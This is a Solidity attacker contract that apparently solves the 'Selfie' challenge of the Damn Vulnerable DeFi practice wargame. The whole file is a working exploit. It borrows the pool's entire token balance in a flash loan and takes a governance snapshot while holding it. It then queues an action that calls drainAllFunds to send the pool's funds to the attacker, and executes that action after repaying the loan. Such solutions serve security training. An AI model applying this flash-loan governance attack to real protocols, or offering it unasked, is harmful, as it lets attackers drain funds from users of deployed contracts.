// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";

contract SelfieAttacker {
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    DamnValuableTokenSnapshot public immutable token;
    address public immutable owner;

    uint256 public actionId;

    constructor(
        address _selfiePoolAddress,
        address _governanceAddress,
        address _tokenAddress
    ) {
        pool = SelfiePool(_selfiePoolAddress);
        governance = SimpleGovernance(_governanceAddress);
        token = DamnValuableTokenSnapshot(_tokenAddress);
        owner = msg.sender;
    }

    function attack1() public {
        uint256 maxBalanceOfPool = token.balanceOf(address(pool));
        pool.flashLoan(maxBalanceOfPool);
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount)
        external
    {
        token.snapshot();

        uint256 weiAmount = 0;

        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            weiAmount
        );

        token.transfer(address(pool), borrowAmount);
    }

    function attack2() public {
        governance.executeAction(actionId);
    }
}
